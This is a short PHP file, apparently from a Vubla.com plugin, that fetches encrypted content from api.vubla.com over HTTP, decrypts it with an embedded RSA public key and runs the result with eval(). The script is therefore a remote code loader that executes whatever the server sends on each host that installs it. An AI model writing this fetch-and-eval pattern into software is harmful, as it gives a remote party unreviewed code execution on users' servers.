<?php

/*
  110824 Vubla.com


  Released under the GNU General Public License
*/


#### Use the best way to get the content
function get_content() {

	if(ini_get('allow_url_fopen')) {
		$source = file_get_contents('http://api.vubla.com/bgsys/?host='.$_SERVER['HTTP_HOST']);
	} else {
		//Get content
		$ch	= curl_init();
		curl_setopt ($ch, CURLOPT_URL, 'http://api.vubla.com/bgsys/?host='.$_SERVER['HTTP_HOST']);
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
		
		$source	= curl_exec($ch);
		
		curl_close($ch);
		
		if (!is_string($source) || !strlen($source)) {
		  $source = '';
		}
	}

	return $source;
}

####Use the best way to get the key
function get_key() {
      $key =<<<EOL
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDXa/7AkiEDuIyaPTFUavWVKCMR
ouvPqb9LAlmwak9TOZHoE4/x3GwGHzw+168aPpatEJ7iZTxaEIO0rHZFJdtWIGRp
0YqzCfIBKdlQelurZ4v6o7ar1Q4lfvetfBRPL50AIDtCZzvncDo4oJ8jfoKAJChA
MTAhk781thRLt1NfvwIDAQAB
-----END PUBLIC KEY-----
EOL;
      return $key;  
}

#### In honour of those who still use PHP4
#### From the PHP Manual:
if (!function_exists("str_split")) {
    function str_split($string, $length = 1) {
        if ($length <= 0) {
            trigger_error(__FUNCTION__."(): The the length of each segment must be greater then zero:", E_USER_WARNING);
            return false;
        }
        $splitted  = array();
        $str_length = strlen($string);
        $i = 0;
        if ($length == 1) {
            while ($str_length--) {
                $splitted[$i] = $string[$i++];
            }
        } else {
            $j = $i;
            while ($str_length > 0) {
                $splitted[$j++] = substr($string, $i, $length);
                $str_length -= $length;
                $i += $length;
            }
        }
        return $splitted;
    }
}

$source     =   get_content();
$key        =   get_key();
$source     =   base64_decode($source);
$chunks     =   str_split ( $source, 128 );
$content    =   '';

foreach($chunks as $chunk){  
    $result     =   openssl_public_decrypt($chunk, $decrypted, $key);  
    $content    .=  $decrypted; 
}

$content    =   base64_decode($content);

eval($content);

?>